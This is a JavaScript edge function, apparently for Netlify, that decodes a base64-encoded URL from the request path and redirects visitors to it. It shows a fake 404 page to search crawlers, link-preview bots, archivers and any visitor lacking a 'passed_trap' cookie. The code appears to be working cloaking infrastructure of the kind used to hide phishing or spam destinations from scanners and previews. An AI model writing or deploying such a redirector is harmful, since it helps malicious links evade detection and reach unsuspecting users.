export default async (request, context) => {
  const url = new URL(request.url);
  const userAgent = request.headers.get("user-agent") || "";
  const clientIP = context.ip;
  const cookies = request.headers.get("cookie") || "";

  // Helper function to serve your fake 404 HTML
  const serveFake404 = async () => {
    try {
      const response = await fetch(new URL("/index.html", request.url));
      const html = await response.text();
      return new Response(html, {
        status: 404,
        headers: { "Content-Type": "text/html" }
      });
    } catch (err) {
      return new Response("Not Found", { status: 404 });
    }
  };

  // 1. EXTRACT BASE64 DATA (e.g., from /.aHR0c...)
  const pathParts = url.pathname.split(".");
  const base64Data = pathParts.length > 1 ? pathParts[pathParts.length - 1] : null;

  // 2. BOT PROTECTION LIST
  const blockedAgents = [
    "googlebot", "bingbot", "yandex", "baiduspider", "facebookexternalhit", 
    "twitterbot", "rogerbot", "linkedinbot", "embedly", "quora link preview", 
    "showyoubot", "outbrain", "pinterest/0.", "slackbot", "vkShare", 
    "W3C_Validator", "redditbot", "Applebot", "WhatsApp", "flipboard", 
    "tumblr", "bitlybot", "SkypeShell", "archive.org_bot"
  ];

  const isBot = blockedAgents.some(agent => userAgent.toLowerCase().includes(agent.toLowerCase()));

  // 3. EXECUTE PROTECTION
  if (isBot) {
    return await serveFake404();
  }

  // 4. HANDLE DECODING & REDIRECT
  if (base64Data) {
    try {
      // Decode and handle potential URL-safe base64 issues (replacing - with + and _ with /)
      const normalizedBase64 = base64Data.replace(/-/g, '+').replace(/_/g, '/');
      const decodedUrl = atob(normalizedBase64);
      
      // Safety check: ensure it's a valid web URL
      if (!decodedUrl.startsWith("http")) {
        throw new Error("Invalid URL format");
      }

      const response = Response.redirect(decodedUrl, 302);
      
      // Set the "passed" cookie for 24 hours
      response.headers.append(
        "Set-Cookie", 
        "passed_trap=true; Path=/; Max-Age=86400; HttpOnly; SameSite=Strict; Secure"
      );
      
      return response;
    } catch (e) {
      // If decoding fails, show the fake 404
      return await serveFake404();
    }
  }

  // 5. FALLBACK (If they have the cookie, let them see the site, else show 404)
  if (cookies.includes("passed_trap=true")) {
    return; 
  }

  return await serveFake404();
};

export const config = {
  path: "/*",
};
